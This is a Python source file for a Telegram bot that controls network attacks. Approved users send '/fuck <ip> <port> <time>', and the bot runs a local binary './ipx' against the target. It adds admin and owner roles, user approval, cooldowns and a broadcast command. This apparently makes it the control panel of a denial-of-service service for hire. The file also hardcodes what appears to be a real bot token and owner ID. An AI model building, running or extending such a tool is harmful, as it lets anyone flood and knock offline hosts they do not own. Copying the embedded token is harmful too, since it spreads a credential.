import telebot
import subprocess
import time
import threading

# Telegram Bot Token
TOKEN = "7564285623:AAF9EeSHMDAR5UF2IFFKAZBNcDvevqGYzis"
OWNER_ID = 930577300  # Replace with your Telegram user ID

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# User and admin lists
approved_users = set()
admins = {OWNER_ID}  # Owner has all permissions
attack_process = None
cooldown_users = {}

# Attack Execution
def start_attack(ip, port, duration, user_id):
    global attack_process

    if user_id in cooldown_users and time.time() < cooldown_users[user_id]:
        bot.send_message(user_id, "Cooldown active! Please wait before launching another attack.")
        return

    if attack_process:
        bot.send_message(user_id, "An attack is already in progress.")
        return

    bot.send_message(user_id, f"Launching attack on {ip}:{port} for {duration} seconds.")
    attack_process = subprocess.Popen(["./ipx", ip, port, duration])

    if user_id not in admins:
        cooldown_users[user_id] = time.time() + 50  # 50 seconds cooldown

    attack_process.wait()
    attack_process = None

# Start Command
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = """Welcome to the bot!
Use /help to see all available commands."""
    bot.send_message(message.chat.id, welcome_text)

# Help Command
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """🔥 *Bot Commands* 🔥

⚡ **Attack Commands**  
  `/fuck <ip> <port> <time>` - Start an attack  
  `/stop` - Stop the attack  
  `/startfuck` - Start another attack  

👑 **Admin Commands**  
  `/add <userid>` - Approve user  
  `/remove <userid>` - Disapprove user  
  `/broadcast <message>` - Send a message to all approved users  
  `/logs` - View command usage logs  

🔧 **Owner-Only Commands**  
  `/addadmin <userid>` - Add an admin  
  `/deladmin <userid>` - Remove an admin  

📌 **Utility Commands**  
  `/ping` - Check bot status  
  `/id @username` - Get user ID  
"""
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

# Telegram Commands
@bot.message_handler(commands=['fuck'])
def attack_handler(message):
    args = message.text.split()[1:]
    user_id = message.chat.id

    if user_id not in approved_users and user_id not in admins:
        bot.send_message(user_id, "You are not authorized to use this command.")
        return

    if len(args) != 3:
        bot.send_message(user_id, "Usage: /fuck <ip> <port> <time>")
        return

    ip, port, duration = args
    threading.Thread(target=start_attack, args=(ip, port, duration, user_id)).start()

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_process
    if attack_process:
        attack_process.terminate()
        attack_process = None
        bot.send_message(message.chat.id, "Attack stopped successfully.")
    else:
        bot.send_message(message.chat.id, "No attack is currently running.")

@bot.message_handler(commands=['startfuck'])
def start_attack_again(message):
    global attack_process
    if attack_process:
        bot.send_message(message.chat.id, "An attack is already in progress.")
    else:
        bot.send_message(message.chat.id, "Use /fuck <ip> <port> <time> to start an attack.")

@bot.message_handler(commands=['add'])
def approve_user(message):
    if message.chat.id not in admins:
        bot.send_message(message.chat.id, "Only admins can approve users.")
        return
    try:
        user_id = int(message.text.split()[1])
        approved_users.add(user_id)
        bot.send_message(user_id, "You have been approved to use attack commands.")
        bot.send_message(message.chat.id, f"User {user_id} has been approved.")
    except:
        bot.send_message(message.chat.id, "Invalid user ID.")

@bot.message_handler(commands=['remove'])
def disapprove_user(message):
    if message.chat.id not in admins:
        bot.send_message(message.chat.id, "Only admins can remove users.")
        return
    try:
        user_id = int(message.text.split()[1])
        approved_users.discard(user_id)
        bot.send_message(message.chat.id, f"User {user_id} has been removed.")
    except:
        bot.send_message(message.chat.id, "Invalid user ID.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.chat.id not in admins:
        bot.send_message(message.chat.id, "Only admins can broadcast messages.")
        return
    text = message.text.replace("/broadcast", "").strip()
    for user in approved_users:
        bot.send_message(user, text)
    bot.send_message(message.chat.id, "Message broadcasted.")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "Only the owner can add admins.")
        return
    try:
        user_id = int(message.text.split()[1])
        admins.add(user_id)
        bot.send_message(message.chat.id, f"User {user_id} is now an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid user ID.")

@bot.message_handler(commands=['deladmin'])
def remove_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "Only the owner can remove admins.")
        return
    try:
        user_id = int(message.text.split()[1])
        admins.discard(user_id)
        bot.send_message(message.chat.id, f"User {user_id} has been removed as admin.")
    except:
        bot.send_message(message.chat.id, "Invalid user ID.")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    bot.send_message(message.chat.id, "Command logging not implemented yet.")

@bot.message_handler(commands=['ping'])
def ping_bot(message):
    bot.send_message(message.chat.id, "Pong! Bot is online.")

@bot.message_handler(commands=['id'])
def get_user_id(message):
    try:
        username = message.text.split()[1].replace("@", "")
        chat_member = bot.get_chat(username)
        bot.send_message(message.chat.id, f"User ID of @{username}: {chat_member.id}")
    except:
        bot.send_message(message.chat.id, "Invalid username or user not found.")

# Start Bot
bot.polling()
